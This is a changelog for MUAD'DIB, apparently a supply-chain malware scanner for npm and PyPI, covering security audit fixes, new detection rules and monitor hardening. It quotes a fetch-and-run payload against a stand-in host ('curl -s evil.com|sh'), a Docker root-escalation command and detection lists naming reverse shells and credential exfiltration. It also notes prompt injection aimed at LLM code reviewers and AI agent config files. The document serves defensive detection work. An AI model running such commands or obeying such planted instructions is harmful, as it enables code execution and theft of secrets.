# Changelog

All notable changes to MUAD'DIB will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Security

- **E3 — ReDoS guard on the `.replace()`-chain resolver (audit 2026-07).** `src/scanner/ast-detectors/handle-call-expression.js` statically re-applied `.replace(/regex/, str)` chains taken from scanned packages, compiling and executing attacker-authored regexes; a catastrophic pattern (e.g. `(a+)+$`) wedged the synchronous scanner (~35s on 28 chars, measured). Added a non-exhaustive blocklist of catastrophic shapes + length caps (layer 1); the hard bound remains the monitor's existing 45s worker-terminate (layer 2, verified to interrupt a running V8 regex mid-backtrack on both Node 24 and the production VPS's Node 20.20.0). Refused patterns leave the chain unresolved (still flagged at depth>=4), never a crash. Tests in `tests/scanner/ast.test.js`.
- **M4 — PARTIAL tar-bomb mitigation (audit 2026-07).** `_extractTarGzImpl` (`src/shared/download.js`) shelled to `tar xzf` with no decompressed-size cap; a ≤50MB-compressed tarball could gzip-expand to many GB on disk. Added a synchronous gzip-ISIZE trailer pre-check (`MAX_EXTRACTED_SIZE` = 1GB) that rejects a declared-oversize archive before `tar` is spawned. **This is a PARTIAL mitigation, not a fix — bypassable by a bomb forged to a multiple of 4GB + (<1GB)**, because the ISIZE trailer is mod 2^32 and wraps under the cap; that residual falls back to the 60s tar timeout. A complete hard cap requires a streaming async extraction refactor, tracked as SEPARATE TECH DEBT (deliberately not done here). Tests in `tests/integration/download.test.js`.
- **E1 — auto-update supply-chain hardening (audit 2026-07; inactive by design).** Hardened `deploy/auto-update.sh` + `deploy/muaddib-update.service` against a compromised update channel: fast-forward-only pulls (refuse a rewritten/force-pushed `origin/master`), `npm ci --ignore-scripts` (dependency lifecycle scripts no longer execute as root — the core RCE vector), opt-in commit-signature verification (`MUADDIB_VERIFY_SIGNATURE=1`, off by default), plus conservative systemd hardening + journald on the unit. **`muaddib-update.service` and its timer are NOT installed on the production VPS — updates are performed manually (SSH + `git pull` + `systemctl restart`) by deliberate operational choice.** This ships as ready-to-use but currently-inactive protection that only takes effect if auto-update is ever enabled. Residuals (documented in `deploy/` comments): the update path still runs as root, and fast-forward-only is integrity, not authenticity (signature verification is opt-in and needs GPG/SSH signing configured).
- **E2 — docker-group root-equivalence documented (audit 2026-07).** `deploy/setup.sh` adds `muaddib` to the `docker` group so the monitor can launch the analysis sandbox (`docker run`); group membership is root-equivalent (`docker run -v /:/host …`). Added an inline risk + remediation note (rootless Docker/Podman, or an `opa-docker-authz` interim); the line is intentionally NOT removed (removing it breaks the sandbox). Documentation only, no functional change — the rootless re-architecture is tracked as infra tech debt.
- **M1 — anti-evasion detector coverage extension (audit 2026-07).** The sandbox-evasion detector (`src/scanner/ast-detectors/anti-evasion.js`) only matched the **charcode-array** form of an analyzer-marker check (`analyzer_honeytoken_reference`, AST-096), plus the structural detonation-gate wall (`anti_analysis_evasion`, AST-095, which needs ≥5 `process.exit` guards); base64/hex-encoded markers and generic `process.env` enumeration slipped through. Extended `detectAnalyzerHoneytoken` to also decode **base64 and hex** marker blobs (not just charcode), and added `detectEnvMarkerEnumeration` for **`process.env` key-enumeration coupled to a `MUADDIB`-prefix key test** (`Object.keys(process.env)…startsWith('MUADDIB')`, `for…in`, `.includes`, `===`), agnostic to the exact var name. Both reuse the existing AST-096 (CRITICAL) — **no new rule; rule count stays 274**. A false positive caught during verification — the env-coupling matched bare `GVISOR` (a real runtime) case-insensitively, flagging legitimate gVisor-detection + env-capture code — was fixed by tightening to the distinctive `MUADDIB` prefix (our own name), case-sensitive. **Honest blind spots (no exhaustive solution — an attacker can always obfuscate further):** no Python parity (`python-source.js` / `python-ast.js` have no anti-evasion detector, so a `setup.py` / `__init__.py` marker check is entirely uncovered); string concatenation (`'M'+'U'+…`) not covered; shell / `postinstall` hooks not covered (JS-only detector); bare-`GVISOR` substring checks deliberately excluded to keep FP~0 after the FP above. Verified self-FP-clean over 173 own source files. Tests in `tests/scanner/ast.test.js`.
- **M1 (PyPI parity) — anti-evasion detection extended to Python (M2 follow-up, 2026-07).** Closes the blind spot M1 itself flagged: `python-source.js` / `python-ast.js` had no anti-evasion detector, so a `setup.py` / `__init__.py` that checks for the sandbox honeytoken was uncovered. (Identified during the M2 evaluation, which concluded the proportionate defence is *static detection*, not chasing sandbox-masking parity across languages.) Mirrors the two JS signals in `python-source.js`, both emitting the existing `analyzer_honeytoken_reference` (AST-096, CRITICAL) — **no new rule; rule count stays 274**: (1) a new `detectPythonEnvMarkerEnumeration` for `os.environ` **enumeration** (`for … in os.environ`, `.keys()`, `.items()`) coupled to a distinctive `MUADDIB`-prefix key test (`.startswith`, `==`, `in`); (2) the shared `detectAnalyzerHoneytoken` **reused as-is** — its base64/hex/charcode decoder is language-agnostic and already matches Python `bytes([...])`, `base64.b64decode(...)` and `\x`-escape encodings of the marker, avoiding duplication. **FP-safe by the same discipline as M1:** it keys on *enumeration*, not direct reads — MUAD'DIB's own tooling reads specific `MUADDIB_*` config vars directly (`os.environ.get('MUADDIB_DATA')`, verified across the repo) and is therefore not flagged; case-sensitive `MUADDIB` (our own name). Verified self-FP-clean over all 69 project `.py` files, and `python-source.js` does not self-trigger the JS detectors that scan it. **`taint-tracker.js` evaluated but deliberately not reused** — it tracks `os.environ` for the credential-exfil taint flow (AST-based), whereas marker detection needs no taint; the regex home in `python-source.js` is the M1-parity fit. **Honest blind spots:** `/proc` fingerprinting is *not* covered (legitimate container-detection code reads `/proc/version` / `/proc/1/cgroup` and tests for `docker` / `gvisor` — the Python equivalent of M1's gVisor false-positive class, too FP-prone for a standalone regex); plaintext direct honeytoken reads are ignored (same stance as the JS side — legit security tooling references markers in the clear); shell / bash install hooks remain uncovered. Tests in `tests/scanner/python-source.test.js`.
- **M3 — gVisor sandbox: visible runc-downgrade warning + opt-in fail-closed (audit 2026-07).** The audit reported gVisor as merely "opt-in with a silent runc fallback". The real gap, verified in code, is narrower but more consequential: the sandbox passes `--runtime=runsc` only when `MUADDIB_SANDBOX_RUNTIME=gvisor` is set (`buildDockerArgs`, `src/sandbox/index.js`), and Docker's default runtime is runc — so on a host where gVisor (runsc) IS installed but that env var is unset (the production case), **every scan silently runs under weaker runc isolation even though the stronger runtime is available**. (The pre-existing fallback was not strictly silent — it logged when gVisor was *requested* but unavailable — but the installed-but-unrequested case produced no signal at all; and there was no fail-closed option.) Extracted the runtime choice into a pure, unit-tested `resolveSandboxRuntime()` and added: (1) a prominent `console.warn` (throttled to once per process; was a plain `console.log`, or nothing at all when the env var was simply unset on a gVisor-capable host) whenever a scan runs under runc while runsc is available or was requested; (2) an **opt-in fail-closed flag `MUADDIB_REQUIRE_GVISOR=1`** — when set and runsc is unavailable, the sandbox refuses the run and returns `INCONCLUSIVE` (score -1, ledgered as `sandbox_inconclusive`, never counted clean — consumed by `scoring.js`) instead of downgrading. `isGvisorAvailable()` is memoized so this stays a per-process `docker info`, not a per-scan one. **Default behavior is unchanged: no mandatory-gVisor mode and no crash — a host without runsc still runs on runc as before, so the existing deployment and all CI sandbox tests keep working** (making gVisor mandatory-always would break both — the same F4/M2 reasoning: the "obvious" hardening breaks a legitimate degraded mode). No new rule (rule count stays 274). 7 Docker-independent tests in `tests/sandbox/gvisor.test.js`. Scope note: `MUADDIB_REQUIRE_GVISOR` fails closed only for the dynamic sandbox, not for the rules-only `muaddib scan` path (which never runs the sandbox); the warning fires on the actionable subset (runsc available or requested), not on every runc scan on non-gVisor hosts (that would be pure noise).

### Changed

- **Documentation resync (2026-07-01).** Reconciled the docs to the live measured counts after the 2.11.118 → 2.11.139 span shipped without individual changelog entries. Rule total **266 → 274** (269 RULES + 5 PARANOID): +8 rules since the 2026-06-14 resync — the new `anti-scanner-injection` scanner (`ASI-001..004`, anti-scanner prompt injection targeting LLM code reviewers, Hades campaign 2026-06), anti-analysis evasion (`AST-095` / `AST-096`), and two compound correlators (`COMPOUND-018` / `COMPOUND-019`). Parallel scanners **20 → 21**; `src/scanner/*.js` root files **33 → 34**; compound rules **17 → 20**; test files **141 → 147** (4500 non-skipped tests, 0 failed on CI). Corrected stale references: the ML LOG-ONLY guard is at `src/monitor/queue.js:1154` / `:1187` (was cited as `:628` / `:660`); `iocs-compact.json` is gitignored and generated at runtime, not committed (only `tests/fixtures/test-iocs.json` is tracked). Version pins `v2.11.117` → `v2.11.139`.

- **Repo hygiene + documentation resync (2026-06-14).** Removed the leftover `data/alerts-sample.tar.gz` fixture from git tracking (the rest of `data/` was already gitignored); moved the 2026-06-14 FPR audit working documents (adjudication, baseline, segment-A diagnosis, typosquat/lifecycle measurement) and the `audit-data/` directory out of the repo root into the gitignored `data/` store; removed the dead `src/ml/model-trees-backup.js` (byte-identical duplicate of `model-trees.js`). Regenerated `sbom.json` (CycloneDX) for 2.11.117. Made the registry-auth http-limiter test hermetic (it no longer depends on the dev machine's `~/.npmrc`). Resynced all docs to current counts: **266 rules** (261 RULES + 5 PARANOID), **33** scanner root files + **3** detector subdirectories (`ast-detectors/`, `module-graph/`, `python-ast-detectors/`), and **141** test files.

## [2.11.117] - 2026-06-14

Consolidated entry for the **2.11.77 → 2.11.117** span (41 patch releases, 2026-06-07 → 2026-06-14): a monitor-daemon production-hardening sprint plus a focused false-positive-reduction pass. Grouped by theme rather than per-version.

### Added

- **Process-wide network "brain" (phase A).** Host-keyed token buckets with a worker token proxy and AIMD backoff, so all monitor workers share one coordinated rate limit against registry.npmjs.org instead of each storming it independently.
- **Memory governor (phase B).** Global admission by ticket + combined RSS/heap watermark, plus a **heavy-lane** that serializes memory-heavy scans (minified-JS weighting, oversize-file routing, reactive heap watermark).
- **Work conservation (phase C).** Interrupted scans are ledgered and respilled (bounded), so partial work survives worker restarts.
- **Degradation registry (phase D).** Named degradation states with sustained-entry alarms and daily visibility.
- **npm registry authentication** (`src/shared/registry-auth.js`). An optional `MUADDIB_NPM_TOKEN` / `NPM_TOKEN` / `~/.npmrc` token raises the per-account rate limit; applied to registry.npmjs.org only, never leaked to other hosts.
- **`muaddib fpr-live`** — operational alert-rate dashboard.
- **Shadow-mode framework** + `compromised_email_domain` V2 + an MCP **zero-width gate** (R5b) with 3-tier shadow classification and an adversarial corpus.
- **F15** `mcp_server_benign_lifecycle` contextual FP cap.

### Changed

- **Reporting / webhook.** Daily report split into Daily (24h) + Ops embeds; unified gate; honest distinct-package coverage; resilience (retry, resend, boot redeliver, env-loader); publish-burst pre-alerts throttled (24h cooldown + reputation filter).
- **IOC loading.** Lean projection of `iocs.json` — workers stop loading the full 223 MB.
- **HTTP limiter.** Token-bucket FIFO + 429 exponential backoff; retries pay their own rate token.
- **Scoring.** Pre-release channel versions inherit partial reputation; tier-1b classification now requires corroboration (IOC matches → tier-1a).
- **CLI.** Professionalized output, rendering-bug fixes, IOC-scraper output cleanup.

### Fixed — false-positive reduction (segment A)

- **`credential_regex_harvest` sink-coupling gate.** A credential-shaped regex co-located with a network call is downgraded unless an independent exfil sink to an anomalous destination co-occurs (blind baseline measured 94.4% FP on the rule alone).
- **Destination-benignness gate** for credential→network taint flows: a flow whose every network destination is loopback/private/reserved IP or a curated SaaS/cloud/AI provider API is a false positive.
- **Source precision.** Config/URL env vars are no longer treated as credential taint sources; write/send/connect sinks are gated on the receiver (process/console are local IO).
- **`axios`** is now recognized as a network call (credential-regex + cross-file sink coverage).
- **Typosquat.** Suffix-only matching collapses the 100% FP band ≥50; boundary-squat gated on generic-word + own-extension deps (TYPO-002).
- **`trusted_new_dependency`** downgraded HIGH→MEDIUM; F12 bundle cap widened.
- **Stability.** OOM / worker-RSS admission fixes; reputation floor; PyPI unblock; GitHub Actions SHA pinning; anti-fragmentation; provenance.

## [2.11.76] - 2026-06-07

### Added

- **Phase 2b - burst pre-alert.** `recentWindowCount` (the uncapped true count of versions published in the recent-publish window, distinct from the capped `recents` list) now drives a burst detector: when a single package crosses 10 versions in the window (account-takeover / Miasma mass-republish pattern), `sendBurstPreAlert()` emits an amber Discord pre-alert (`buildBurstPreAlertEmbed`). Fire-and-forget, deduped per name/window (one ping per burst, not per version). Files: `src/monitor/webhook.js`, `src/monitor/ingestion.js`, `src/monitor.js`.

### Changed

- **Phase 2b - protected queue eviction.** When the scan queue hits its cap, eviction now protects high-signal entries (IOC match, active burst, first-publish, account-takeover) from being dropped, with a strict-oldest fallback when every candidate is protected. Prevents a flood of low-signal packages from evicting the packages most likely to be malicious. Files: `src/monitor/queue.js`, `src/monitor/scan-queue.js`. New test `tests/integration/scan-queue-cap.test.js`.

## [2.11.75] - 2026-06-07

### Added

- **Phase 4 - crates.io light pre-alert.** GHSA poller ecosystem set extended with `crates` (`GHSA_ECOSYSTEMS += crates`, rust/crates mapping). New `POPULAR_CRATES` list (~88 crates: serde, tokio, hyper, reqwest, async-trait, ...) + `findCratesTyposquatMatch()` (Levenshtein, IOC-independent) in `src/scanner/typosquat.js`. Rust GHSA pre-alerts are enriched with the nearest popular-crate typosquat match (e.g. "serde_typo resembles serde"). Light pre-alert only: no crates tarball download / sandbox. Files: `src/scanner/typosquat.js`, `src/ioc/ghsa-poller.js`.

## [2.11.74] - 2026-06-07

### Added

- **Phase 2a - PyPI pre-alert parity.** Pre-alert embeds are now ecosystem-aware: `registryLink()` resolves npm vs PyPI, and `buildIOCPreAlertEmbed` / `buildCampaignPreAlertEmbed` are pure builders reused across ecosystems. PyPI campaign pre-alerts now fire at parity with npm. First-publish detection extended to PyPI (flag + cache). Files: `src/monitor/ingestion.js`, `src/monitor/webhook.js`, `src/monitor/classify.js`, `src/monitor.js`, `src/monitor/queue.js`.

### Changed

- The T1a sandbox gate stays npm-only: PyPI packages take the pre-alert path without the npm sandbox stage.

## [2.11.73] - 2026-06-07

### Added

- **Phase 5 - coverage-audit capstone.** New `scripts/coverage-audit.js` joins the GHSA malware denominator (`data/ghsa-malware.jsonl`) against scan-ledger outcomes + the tarball archive to compute an honest, GHSA-denominated **operational TPR** (`classifyCoverage()` -> alerted / scannedClean / dropped / neverSeen ; `operationalTPR = alerted / total`). Outputs `data/coverage-audit.json` + `data/gt-proposals.json` (scannedClean misses surfaced as ground-truth candidates, human-gated promotion). This is the real operational detection rate, distinct from the static ground-truth TPR and from the ledger alertRate. New test `tests/unit/coverage-audit.test.js`.

## [2.11.72] - 2026-06-07

### Added

- **Phase 2c part 2 - active GHSA poller.** New `src/ioc/ghsa-poller.js` polls the GitHub Advisory Database for `type=malware` advisories every ~15 min (npm + pypi). It persists each advisory's packages to `data/ghsa-malware.jsonl` (the Phase 5 coverage denominator), pre-alerts genuinely fresh names as early warning, records withdrawn advisories (`withdrawn_at`) to the scan-ledger as `outcome:dropped`, and feeds its fetch count into the feed-health alarm. `fetchAllGhsaMalware()` provides the paginated full list. The poller does NOT inject scans into the live queue (GHSA lags downstream vendors). New test `tests/unit/ghsa-poller.test.js`.

## [2.11.71] - 2026-06-07

### Added

- **Phase 2c part 1 - feed-health alarm.** New `src/ioc/feed-health.js` detects silent IOC-feed failures (a feed returning 0 after a healthy baseline = stale data / broken endpoint). One-shot alarm on healthy->dark transition + recovery notice on dark->alive (`evaluateFeedHealth()` pure core, state in `data/feed-health.json`, baseline min 5 IOCs to avoid FPs on small feeds). Best-effort: never breaks the IOC refresh. OSM alert path token-gated. Files: `src/ioc/feed-health.js`, `src/ioc/updater.js`. New test `tests/unit/feed-health.test.js`.

## [2.11.70] - 2026-06-07

### Added

- **Phase 1b - compound Phantom Gyp (the real fix).** New post-processor `src/scanner/phantom-gyp.js` (`correlatePhantomGyp`, called from `src/pipeline/processor.js`) emits **MUADDIB-COMPOUND-017 `gyp_phantom_exec`** (CRITICAL) only when a `binding.gyp` command-substitution sink (`<!(node x.js)` / `<!(python y.py)`) correlates with an independent malice verdict on the invoked file (a CRITICAL verdict or high-confidence-malice type from the AST / dataflow / module-graph scanners). Because the verdict comes from proven detectors, FP is bounded by theirs (~0 by construction). Added to `SINGLE_FIRE_CRITICAL_TYPES` (now 6) and `HIGH_CONFIDENCE_MALICE_TYPES` (now 30). This is the precise compound that closes the gap the Phase 1 marker (PKG-023) only flags. New test `tests/scanner/phantom-gyp.test.js` + benign/malicious fixtures.

## [2.11.69] - 2026-06-07

### Changed

- **Phase 3a - sandbox decoupling.** The deferred T1a sandbox stage now runs via `src/monitor/deferred-sandbox.js` asynchronously, so a slow Docker sandbox no longer holds a scan worker hostage: workers are freed back to the pool immediately. Files: `src/monitor/deferred-sandbox.js`, `src/monitor/queue.js`.

## [2.11.68] - 2026-06-07

### Added

- **Phase 0b - ledger rollup.** `computeLedgerRollup(sinceTs)` in `src/monitor/state.js` streams the scan-ledger and groups outcomes by ecosystem (total / scanned / dropped / alerted / vanished + `alertRate`), with fair-window filtering. Surfaced as a new "Ledger (24h)" section in the daily report and as operational node metrics, with a trend regression-check. Note: `alertRate` is an operational throughput signal, NOT detection TPR (the real operational TPR comes from the Phase 5 coverage-audit). Files: `src/monitor/state.js`, `src/monitor/webhook.js`, `src/commands/evaluate.js`, `scripts/regression-check.js`. New test `tests/report/webhook.test.js`.

## [2.11.67] - 2026-06-07

### Added

- **Phase 0a - per-scan coverage ledger.** New `src/monitor/state.js` with `appendScanLedger()` writing one outcome row per scanned package to `data/scan-ledger.jsonl` (ts, name, version, ecosystem, outcome, score, tier, maxSeverity, types, sandbox, firstPublish, source ; auto-compacted at `MAX_SCAN_LEDGER`). The authoritative per-package record consumed by the Phase 0b rollup and the Phase 5 coverage-audit. New test `tests/unit/scan-ledger.test.js`.
- **Phase 1 - Phantom Gyp speed-bump.** New rule **MUADDIB-PKG-023 `gyp_command_exec`** (CRITICAL) flags `binding.gyp` GYP command-substitution (`<!(...)` / `<!@(...)`): install-time code execution via node-gyp without a package.json lifecycle script. This is a danger-marker / speed-bump (it surfaces the pattern) ; the precise FP-safe verdict is the Phase 1b compound (COMPOUND-017, v2.11.70).
- **Phase 4-archive - alert-only retention.** `src/scanner/tarball-archive.js` now persists a package tarball (.tgz) only when its score >= 20, cutting archive disk churn to suspect packages only.

### Changed

- **Phase -1 - ops hardening.** Disk-space guard, POSIX ACL fixes, resurrected IOC feeds, OSM token wiring, and a disk-guard around archive writes (follow-up to the 2026-05-24 disk-fill incident).

## [2.11.66] - 2026-06-06

### Fixed

- IOC store singleton: root cause of the monitor heap leak (the store was re-instantiated per scan instead of shared).

## [2.11.65] - 2026-06-06

### Fixed

- Project npm packuments before caching: stop holding full packuments in memory (heap leak).

## [2.11.64] - 2026-06-06

### Fixed

- Poll watchdog + HTTP deadline to unwedge a stalled monitor poll loop, plus heap diagnostics.

## [2.11.63] - 2026-06-05

### Changed

- Republish (v2.11.62 was already on npm).

## [2.11.62] - 2026-06-05

### Fixed

- Kill the `loadash` typosquat cycle (a stale `package.json` rewrite kept reintroducing the `lodash` typosquat) and arm the PR guard `scripts/check-deps-typosquats.js` so CI fails if `loadash` reappears in `dependencies` / `devDependencies`.

## [2.11.61] - 2026-06-05

### Fixed

- Skip the sandbox on a memory-IOC match + handle native binary shards.

## [2.11.60] - 2026-06-05

### Fixed

- Monitor crash-resilience P0+P1+P2 (partial-work recovery, streaming writes, error summaries logged even on crash).

## [2.11.59] - 2026-06-05

### Fixed

- Eliminate the per-worker npm 429 storm.

## [2.11.58] - 2026-06-04

### Fixed

- Coordinated 429 backoff + env-tunable registry limits. `fetchWithRetry` now honors the limiter's coordinated `signal429()` backoff instead of each worker retrying independently (thundering-herd 429s). This is the fix for the documented "benign FPR drift 1.10% -> 6.6% measurement artifact" (transient npm-registry metadata rate-limiting starving `reputationFactor`).

## [2.11.57] - 2026-06-04

### Changed

- **Behavioral-test refactor (phase 2): drained the structural source-grep worklist 124 → 0 non-allowlisted.** "Structural" tests that read an implementation file and assert it `.includes()` a string give false confidence — they break on a harmless rename and pass when the logic is broken but the string survives. Every site with a behavioral equivalent was converted; the irreducible remainder is documented and allowlisted.
  - **Production seams extracted (pure refactors, behavior unchanged):**
    - `buildDockerArgs(opts)` + `generateFakeHostname()` in `src/sandbox/index.js` — the `docker run` argument vector is now built by a pure, exported function, so the isolation flags (`--cap-drop=ALL`, `--read-only`, `--security-opt no-new-privileges`, tmpfs), the anti-fingerprint hostname, the canary env injection, the gVisor runtime selection, and the libfaketime/time-offset wiring are unit-testable without spawning Docker.
    - `computeWorkersToSpawn(target, active, queueLen)` in `src/monitor/queue.js` — the adaptive worker-pool spawn-count decision is now a pure, exported seam.
  - **Conversions:** sandbox docker-args / hostname / gVisor (via `buildDockerArgs`); preload `/proc/1/cgroup` + `/proc/uptime` spoofing, `process.dlopen` → `NATIVE_ADDON`, and `worker_threads` → `WORKER` (via the `runWithPreload` subprocess harness, cross-platform); the memory-pressure circuit breaker (`computeMemoryPressure`), adaptive concurrency (`computeTarget`), and worker-pool accessors; queue/seq crash-recovery (`persistQueue`/`restoreQueue` + `saveNpmSeq`/`loadNpmSeq` round-trip); CLI flags (`--auto-sandbox`, `relabel`, `--version`) via real CLI invocation; metadata-cache + tarball-archive wiring via real module load.
  - **Guard enforced:** `tests/meta/no-source-grep.test.js` now fails the suite on any NEW source-grep outside the documented C4 allowlist (`GUARD_ENFORCED = true`).
  - **C4 allowlist (51 sites, documented by rationale):** bash scripts (`docker/sandbox-runner.sh`, `deploy/auto-update.sh`) executed only inside Docker/the VPS; the container kill-ladder + timeout control-flow; daemon-loop integration (auto-relabel, ingestion backpressure); cross-module metadata-cache reuse; "must-not-contain" security/cleanup absence guards; debug-gated error-logging hygiene. Each has no behavioral equivalent on a Docker-less host, and the behaviorally-testable side of every contract is converted.
- **Tests:** 3969 passed, 0 failed (14511 skipped without Docker). **Lint:** 0 errors.
- **Detection-neutral (verified):** the extracted seams live in the Docker-sandbox and monitor-daemon modules, which are not loaded during a static scan, so they cannot affect detection. Confirmed deterministically with `muaddib replay` — ground-truth detection is byte-identical between clean HEAD and the refactored branch (same 94 in-scope samples, same 12 pre-existing misses, zero new or changed detections). The pre-refactor `evaluate` baseline (v2.11.56) therefore stands.

## [2.11.41] - 2026-05-25

### Added

- New scanner `src/scanner/python-source.js` (19th parallel scanner). Walks `__init__.py`, `setup.py`, top-level `*.py`, and `src/<pkg>/__init__.py` (PEP-518 layout) for import-time / install-time RCE patterns. Closes the TrapDoor (mai 2026) PyPI gap — 0/7 packages of the campaign were detected pre-PYSRC. (PR #480)
- 8 new rules MUADDIB-PYSRC-001..008:
  - **PYSRC-001** `import_time_exec` CRITICAL — `exec()` / `eval()` at module level in `__init__.py` / `setup.py`.
  - **PYSRC-002** `import_time_subprocess` CRITICAL — `subprocess.Popen/run/call/check_output/getoutput`.
  - **PYSRC-003** `import_time_os_system` CRITICAL — `os.system()` / `os.popen()` / `os.spawn*()` / `os.exec*()`.
  - **PYSRC-004** `import_time_fetch_exec` CRITICAL (compound) — network fetch (urllib / requests / http.client / httpx / aiohttp) AND `exec`/`eval` in the same file (TrapDoor signature: remote-payload-then-RCE).
  - **PYSRC-005** `import_time_base64_exec` CRITICAL (compound) — `base64.b64decode()` / `codecs.decode()` AND `exec`/`eval` in the same file.
  - **PYSRC-006** `import_time_deserialization` CRITICAL — `pickle.loads()` / `marshal.loads()` / `dill.loads()` / `cloudpickle.loads()` / `jsonpickle.loads()` / `shelve.loads()` (RCE via unsafe deserialization).
  - **PYSRC-007** `dynamic_dangerous_import` HIGH — `__import__('subprocess'|'os'|'requests'|'urllib'|'socket'|'http'|'ssl'|'ctypes'|'importlib')` (obfuscation pattern to evade static `import X` tracking).
  - **PYSRC-008** `python_source_unicode_obfuscation` CRITICAL — ≥5 invisible Unicode chars in a `.py` file (mirror of AICONF-004 for Python source).
- Source preprocessing — strips Python full-line comments and triple-quoted strings before regex (reduces FPs on docstrings mentioning `exec` / `subprocess`).
- Defense in depth — `python-source.js` also imports `stripInvisibleUnicode()` from `src/shared/unicode-invisibles.js` (shared with `ai-config.js`) and applies it before pattern matching.
- 20 new tests + 12 test fixtures under `tests/samples/python-source/` (8 positive TrapDoor-style inert, 4 negative FP-control). Smoke FP-tested against the 4 most popular legitimate PyPI sdists (click, flask, pytest, requests): 0/4 PYSRC fires. (PR #480)

## [2.11.40] - 2026-05-25

### Added

- New rule MUADDIB-AICONF-004 `aiconf_unicode_obfuscation` CRITICAL — detects ≥5 zero-width / directional / variation-selector codepoints in AI agent config files (`.cursorrules`, `CLAUDE.md`, `.windsurfrules`, `AGENT.md`, `.github/copilot-instructions.md`, `.claude/settings.json`). Closes the TrapDoor (mai 2026) attack vector that hides exfil instructions from human review by interspersing U+200B inside keywords. (PR #479)

### Changed

- `src/scanner/ai-config.js` now normalizes file content via `stripInvisibleUnicode()` before applying pattern regex. A payload like `cu​rl -s evil.com|sh` (ZWSP-split keyword) now matches `SHELL_COMMAND_PATTERNS` after normalization. (PR #479)
- Refactor — extracted shared helpers `countInvisibleUnicode()` + new `stripInvisibleUnicode()` into `src/shared/unicode-invisibles.js`. `src/scanner/obfuscation.js` updated to import from the shared module (no behavioral change to OBF-003). Codepoint coverage extended: U+200E/F LRM/RLM, U+202A-E directional override, U+2061-4 invisible math operators added to the existing set (ZWSP/ZWNJ/ZWJ, word joiner, BMP & supplementary variation selectors, tag chars). (PR #479)

## [2.11.39] - 2026-05-25

### Fixed

- Monitor — extract `.whl` (Python wheel) tarballs via `adm-zip` instead of falling back to `tar` (which was the wrong format for wheels, producing silent extraction failures). (PR #478)
- Monitor — daily coverage metric now uses `unique_attempts / publish_events` per ecosystem (npm + pypi) instead of an inconsistent aggregate that mixed both. (PR #478)

## [2.11.38] - 2026-05-25

### Added

- CycloneDX 1.5 SBOM export (`--cyclonedx <path>` CLI flag). Generates a Software Bill of Materials in the CycloneDX 1.5 JSON format covering scanned npm + PyPI dependencies. (PR #477)

### Fixed

- AST-091 self-FP — `ctx.relPath` typo + missing `EXCLUDED_FILES` filter caused the rule to fire on MUAD'DIB's own source files during self-scan. (PR #477)

## [2.11.37] - 2026-05-24

### Added

- Risk-domain taxonomy — 5-domain classification (MAL malware / AUT author / ENG engineering / VUL vulnerability / LIC license) applied to all 232 rules. Output now includes the `domain` field in SARIF, JSON, HTML, and CLI reports for filtering / triage. (PR #476)

## [2.11.36] - 2026-05-24

### Added

- New rule MUADDIB-MAINTAINER-006 — detects npm package maintainers whose email domain shows up as compromised / suspended via RDAP lookup (e.g. domain registered very recently, registrar action). Catches sleeper-domain takeover patterns. (PR #475)

## [2.11.35] - 2026-05-24

### Added

- New rule MUADDIB-MAINTAINER-005 — detects npm package maintainers whose email domain has no valid DNS MX record (unclaimed / expired domain, signal of credential-takeover risk via email recovery). (PR #474)

## [2.11.34] - 2026-05-24

### Changed

- F5 (sensitive-files contextual FP cap feature) — extended credential path coverage to cloud (AWS / Azure / GCP creds), DB (common connection-string locations), and HTTP auth (Authorization headers / token file paths). Reduces false negatives where a credential read into a small set of well-known sensitive paths was not blocking the F5 cap. (PR #473)

## [2.11.33] - 2026-05-24

### Added

- New rule MUADDIB-AST-092 `silent_stealth_process` CRITICAL — detects `child_process` calls combining `detached: true` + `stdio: 'ignore'`. Pattern observed on TrapDoor `build-scripts-utils` / `async-pipeline-builder` (mai 2026) where the child process survives parent exit and produces zero observable output (full stealth). Emitted in addition to AST-012 (Detached Background Process) for the same call site. (PR #472)

## [2.11.32] - 2026-05-24

### Added

- New rule MUADDIB-PKG-022 `release_zero_package` — detects packages publishing `0.x.x` versions with suspicious manifest signatures (intent: ship-as-vulnerable, common pattern in typosquat / release-day attack scenarios). (PR #471)

## [2.11.31] - 2026-05-24

### F14 contextual FP cap — HARD vs SOFT exfil split (F9/F10/F11)

Suite au diagnostic du 2026-05-24 sur les 124 FPs >= 90 du corpus
`Data/all-review-results.json` (rescan v2.11.30 + matrice des conditions
F-cap dans `data/rescan/REPORT.md`), 46/107 packages restaient a 90-100
post-cap. Pour 41 d'entre eux, le bloqueur etait la condition `C5 — no
third-party exfil` des features F9/F10/F11 — qui se disqualifiaient sur
des threats compound/intent (`intent_credential_exfil`,
`suspicious_dataflow`, `detached_credential_exfil`) qui fire
legitimement sur tout proxy AI faisant `process.env.ANTHROPIC_API_KEY` →
POST `api.anthropic.com`.

Ces threats compound co-occurrent sur n'importe quel package AI/MCP/CLI
qui lit une cle API et la POST vers son endpoint legitime. Ils ne sont
malveillants qu'en combinaison avec un signal HARD (destination
suspecte, fetch+exec binaire, dep non-npm). Les disqualifier sur ces
seuls signaux laissait codexmate, @cachly-dev/init, @roadmapfy/mcp-init,
poseidon-flow, nodebb-plugin-flawless-donations (Stripe), usegrain,
lazyclaw, multis, atel-mcp-openclaw, opuscode, etc. — tous a 100/100.

#### Changements

- **Ajoute** `HARD_EXFIL_TYPES` set dans `src/ml/feature-extractor.js`
  (12 types) — signaux malware sans ambiguite : `suspicious_domain`,
  `remote_code_load`, `fetch_decrypt_exec`, `reverse_shell`,
  `binary_dropper`, `download_exec_binary`, `curl_env_exfil`, `curl_exec`,
  `external_tarball_dep`, `dependency_url_suspicious`,
  `blockchain_c2_resolution`, `dns_exfil`.
- **Ajoute** `SOFT_EXFIL_TYPES` set (4 types) — compounds/intents qui
  fire sur AI proxies legit : `suspicious_dataflow`,
  `intent_credential_exfil`, `intent_command_exfil`,
  `detached_credential_exfil`.
- **F9 (mcpServerEnvAccess)** : C5 utilise `HARD_EXFIL_TYPES.has(t.type)`
  au lieu de `F9_EXFIL_TYPES.has(t.type)`.
- **F10 (vendorCliSdk)** : meme changement sur C5.
- **F11 (aiAgentBot)** : unifie la veto hard-exfil avec F9/F10. Pre-F14,
  F11 ne bloquait que sur 4 types (`mcp_config_injection`,
  `suspicious_domain`, `binary_dropper`, `download_exec_binary`). Post-
  F14, F11 bloque sur les 12 `HARD_EXFIL_TYPES` — `remote_code_load`
